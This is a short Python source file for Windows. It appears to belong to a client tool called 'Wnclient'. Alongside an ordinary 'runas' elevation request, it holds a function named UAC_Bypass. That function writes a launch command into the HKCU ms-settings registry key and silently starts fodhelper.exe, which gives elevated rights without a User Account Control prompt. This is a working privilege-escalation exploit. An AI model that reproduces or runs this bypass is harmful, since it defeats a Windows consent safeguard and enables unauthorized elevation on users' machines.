import ctypes
import platform
import lwjgl
import sys
import os
import pathlib
import subprocess
import winreg

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def Universal():
    if platform.system() == 'Windows':
        if not is_admin():
            res_code = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, os.path.join(pathlib.Path(__file__).parent.parent.parent,"main.py"), None, 1)
            if res_code <= 32:
                lwjgl.error(f"Failed to elevate power, return: {res_code}")
            else:
                lwjgl.info("You have acquired administrator privileges, please use the new window")
                exit()
    else:
        lwjgl.error("It can only run on Windows")

def UAC_Bypass():
    payload_cmd = f'cmd.exe /c "cd /d "{pathlib.Path(__file__).parent.parent.parent}" && "{sys.executable}" main.py"'
    try:
        key_path = r"Software\Classes\ms-settings\shell\open\command"
        

        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
        except WindowsError:
            pass
        
   
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload_cmd)
        
        winreg.CloseKey(key)
        
    except Exception as e:
        lwjgl.error(e)
        
    
    try:
        system32 = os.path.join(os.environ['WINDIR'], 'System32')
        fodhelper_path = os.path.join(system32, 'fodhelper.exe')
        
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        subprocess.Popen([fodhelper_path], startupinfo=startupinfo, shell=True,start_new_session=True)
        lwjgl.info("Create Success")
        lwjgl.info("You can use Wnclient in a new window")
        sys.exit()
        
        
    except Exception as e:
        lwjgl.error(e)